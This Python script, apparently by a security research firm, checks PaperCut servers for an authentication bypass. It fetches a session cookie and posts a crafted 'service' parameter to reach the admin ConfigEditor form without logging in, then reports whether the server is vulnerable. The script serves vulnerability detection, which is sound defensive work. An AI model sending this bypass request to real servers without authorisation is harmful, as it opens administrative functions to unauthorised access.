import argparse
import urllib3

import requests

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        watchTowr-vs-PaperCut-WT-2026-0143.py
        (*) WT-2026-0143/WT-2026-0142/CVE-2026-81578 - PaperCut Authentication Bypass Detection Artifact Generator

          - Piotr (@chudyPB) of watchTowr (@watchTowrcyber)
"""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def dag(host):

    print('[+] Starting WT-2026-0143/WT-2026-0142/CVE-2026-81578 DAG')
    print('[+] Getting JSESSIONID cookie from /app endpoint')

    sess = requests.session()

    url = f'{host}/app'

    sess.get(url, verify = False)

    print('[+] Trying to access ConfigEditor/quickFindForm with authentication bypass')

    headers = {'Origin': host, 'Content-Type': 'application/x-www-form-urlencoded'}

    data = {'service': 'direct/1/Home/ConfigEditor/quickFindForm', 'sp':'S1'}

    resp = sess.post(url, headers = headers, data = data, verify = False, allow_redirects = False)
    
    if resp.status_code == 200 and 'ConfigEditor/quickFindForm' in resp.text:
        print('[+] VULNERABLE - Home page can be used to access arbitrary forms')
    elif resp.status_code == 302 and '/Home' in resp.headers['Location']:
        print('[-] NOT VULNERABLE - Home with arbitrary forms redirects to /Home endpoint')
    else:
        print('[+/-] UNKNOWN MESSAGE - please verify manually.')


if __name__ == "__main__":

    print(banner)

    usage = """python3 poc.py [-h] -H HOST \r\n\r\n\
        For more help, use "python3 poc.py --help"
        INFO HERE
        """
    parser = argparse.ArgumentParser(description = 'WT-2026-0143/WT-2026-0142/CVE-2026-81578 - PaperCut Authentication Bypass Detection Artifact Generator', usage = usage)
    
    #required arg
    parser.add_argument('-H', dest = 'host', action = "store", type = str, help = 'Host, eg. "http://papercut.lab:9191"', required = True)

    #get arguments
    args = parser.parse_args()
    host = args.host

    if host[-1] == '/':
        host = host[:-1]

    dag(host)
